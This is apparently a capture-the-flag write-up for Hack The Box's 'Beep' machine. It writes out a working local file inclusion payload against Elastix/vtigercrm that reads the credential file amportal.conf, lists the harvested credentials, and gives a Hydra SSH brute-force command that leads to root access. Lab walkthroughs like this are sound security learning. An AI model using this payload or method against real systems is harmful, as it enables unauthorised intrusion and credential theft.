# Beep

## Info  
  * IP: 10.10.10.7
  * OS: Linux
  * Difficulty: Easy

## System Enumeration

### NMAP

![Beep Nmap](boxImages/Beep/nmap.png "NMAP")

### Web Page

![Beep WebPage](boxImages/Beep/webpage.png "Web Page")

## Exploitation

Since our webpage is an Elastix login, we should simply check if an exploit for elastix exists.  
Using `searchsploit elastix` we find:

![SearchSploit](boxImages/Beep/searchsploit.png "Searchsploit Output")

Trying out the local file inclusion vulnerability

![Exploit Documentation](boxImages/Beep/exploitcode.png "LFI graph.php")

`LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`  

After appending this address to the web portal `10.10.10.7` we can see the `amportal.conf` file which consists of important user data.  
Simply viewing the source code, we see the data in a readable format

![Exploit Page Source Code](boxImages/Beep/exploitpage.png "Source Code")

So we make 2 lists for possible users and passwords

#### Users.txt(users on my local machine)
  ```
  root
  mysql
  cyrus
  asterisk
  spamfilter
  fanish
  ```
#### password.txt(pws on my local machine)
  ```
  asterisk
  amp109
  jEhdIekWmdjE
  passw0rd
  ```

### Hydra
After creating the lists of users and passwords we simply run Hydra to check possible ssh combinations.  
Using the command:  
`hydra -L users -P pws ssh://10.10.10.7`

![Hydra](boxImages/Beep/hydra.png "Hydra")

### Root Owned

Now we simply ssh, with the password that we got as root and we're in

![Rooted](boxImages/Beep/owned.png "Pwnage")

Simply traverse to the `/root` directory for `root.txt` and to `home/fanis` for `user.txt`

